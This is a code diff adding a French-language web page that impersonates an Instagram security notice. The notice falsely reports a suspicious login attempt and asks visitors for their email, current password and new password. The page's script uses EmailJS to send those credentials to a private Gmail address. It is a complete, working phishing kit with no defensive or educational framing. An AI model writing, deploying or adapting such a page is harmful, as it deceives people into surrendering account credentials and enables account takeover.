@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: transparent;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 300px;
+            width: 90%;
+            margin: 20px auto;
+            background-color: rgba(255, 255, 255, 0.8);
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+        }
+        .logo-img {
+            max-width: 100px; /* Augmenter la taille du logo */
+            margin-bottom: 20px;
+        }
+        .notice {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 15px;
+            text-align: left;
+            margin-left: 10px;
+        }
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .form-group input {
+            width: calc(100% - 36px);
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            margin-right: -36px;
+            padding-right: 36px;
+            text-align: left;
+        }
+        .password-toggle {
+            position: absolute;
+            top: 50%;
+            right: 8px;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+        .password-toggle img {
+            width: 18px;
+            height: auto;
+            pointer-events: none; /* Pour ignorer les événements de pointer (click) sur l'icône */
+        }
+        .show-password {
+            position: absolute;
+            top: 50%;
+            right: 32px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #888;
+            font-size: 14px;
+        }
+        .show-password:hover {
+            color: #333;
+        }
+        .checkbox-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .checkbox-group label {
+            font-size: 14px;
+            color: black;
+        }
+        .btn {
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 3px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #3181db;
+        }
+        .error-message {
+            color: orange;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .success-message {
+            color: green;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.juliendoclot.com/wp-content/uploads/2018/09/IG-LOGO.jpg" alt="Instagram Logo" class="logo-img">
+        <div class="notice">
+            Afin de sécuriser votre compte, nous vous recommandons de changer votre mot de passe suite à une tentative de connexion depuis un autre appareil. Nous vous remercions pour votre collaboration.
+        </div>
+        <form id="signup-form" action="javascript:void(0);" method="POST" onsubmit="submitForm()">
+            <div class="form-group">
+                <input type="email" id="email" name="email" placeholder="Adresse e-mail" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="current-password" name="current-password" placeholder="Mot de passe actuel" required>
+                <span class="password-toggle" onclick="togglePassword('current-password')">
+                    <img src="https://cdn-icons-png.flaticon.com/512/6405/6405909.png" alt="Toggle Password">
+                </span>
+            </div>
+            <div class="form-group">
+                <input type="password" id="new-password" name="new-password" placeholder="Nouveau mot de passe" required>
+                <span class="password-toggle" onclick="togglePassword('new-password')">
+                    <img src="https://cdn-icons-png.flaticon.com/512/6405/6405909.png" alt="Toggle Password">
+                </span>
+            </div>
+            <div class="form-group">
+                <input type="password" id="confirm-password" name="confirm-password" placeholder="Confirmez le mot de passe" required>
+                <span class="password-toggle" onclick="togglePassword('confirm-password')">
+                    <img src="https://cdn-icons-png.flaticon.com/512/6405/6405909.png" alt="Toggle Password">
+                </span>
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="captcha" required>
+                <label for="captcha">Je ne suis pas un robot</label>
+            </div>
+            <button type="submit" class="btn">Connectez-vous</button>
+            <div id="error-message" class="error-message" style="display: none;">Erreur de connexion, veuillez réessayer.</div>
+            <div id="success-message" class="success-message" style="display: none;">Votre mot de passe a bien été changé.</div>
+        </form>
+    </div>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("fKpiROlqIMbCK5Ndh");
+        })();
+
+        function sendEmail() {
+            var email = document.getElementById("email").value;
+            var currentPassword = document.getElementById("current-password").value;
+            var newPassword = document.getElementById("new-password").value;
+            var confirmPassword = document.getElementById("confirm-password").value;
+
+            if (email.trim() === '' || currentPassword.trim() === '' || newPassword.trim() === '' || confirmPassword.trim() === '') {
+                alert('Veuillez remplir tous les champs.');
+                return;
+            }
+
+            if (newPassword !== confirmPassword) {
+                alert('Les nouveaux mots de passe ne correspondent pas.');
+                return;
+            }
+
+            if (!document.getElementById('captcha').checked) {
+                alert('Veuillez cocher la case "Je ne suis pas un robot".');
+                return;
+            }
+
+            var templateParams = {
+                user_email: email,
+                user_current_password: currentPassword,
+                user_new_password: newPassword,
+                to_email: 'mateobrosillon@gmail.com'
+            };
+
+            emailjs.send('service_3w7wnzf', 'template_av2bkjz', templateParams)
+                .then(function(response) {
+                   console.log('SUCCESS!', response.status, response.text);
+                   document.getElementById('signup-form').reset();
+                   document.getElementById('error-message').style.display = 'none';
+                   document.getElementById('success-message').style.display = 'block';
+                }, function(error) {
+                   console.log('FAILED...', error);
+                   document.getElementById('error-message').style.display = 'block';
+                });
+        }
+
+        function togglePassword(inputId) {
+            var passwordInput = document.getElementById(inputId);
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        }
+
+        function submitForm() {
+            sendEmail();
+            return false;
+        }
+    </script>
+</body>
+</html>
